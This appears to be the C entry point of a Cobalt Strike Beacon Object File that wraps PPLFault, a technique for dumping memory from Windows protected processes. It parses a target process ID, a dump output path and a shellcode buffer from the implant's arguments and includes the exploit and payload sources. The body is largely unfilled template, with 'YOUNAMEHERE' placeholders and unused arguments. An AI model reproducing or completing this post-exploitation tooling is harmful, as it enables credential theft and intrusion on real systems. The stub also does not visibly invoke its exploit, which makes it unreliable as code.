#include <phnt_windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "PayloadUtils.cpp"
#include "MemoryCommand.cpp"
#include "payload.cpp"
#include "PPLFault.cpp"

extern uint8_t* shellcode;
extern DWORD shellcodelen;

//Need PID, dmptarget and shellcode buffer
VOID go(
	IN PCHAR Buffer,
	IN ULONG Length
)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	// $args = bof_pack($1, "zi", $string_arg, $int_arg);
	datap parser = { 0 };
	const char* string_arg = NULL;
	int int_arg = 0;

	BeaconDataParse(&parser, Buffer, Length);
	DWORD pid = BeaconDataInt(&parser);
	wchar_t* outputpath = (wchar_t*)BeaconDataExtract(&parser, NULL);
	shellcode = (uint8_t*)BeaconDataExtract(&parser, (int*) & shellcodelen);


	if (!bofstart())
	{
		return;
	}

	internal_printf("Calling YOUNAMEHERE with arguments %s and %d\n", string_arg, int_arg);

	
	if (ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "YOUNAMEHERE failed: %lX\n", dwErrorCode);
		goto go_end;
	}

	internal_printf("SUCCESS.\n");

go_end:

	printoutput(TRUE);

	bofstop();
};

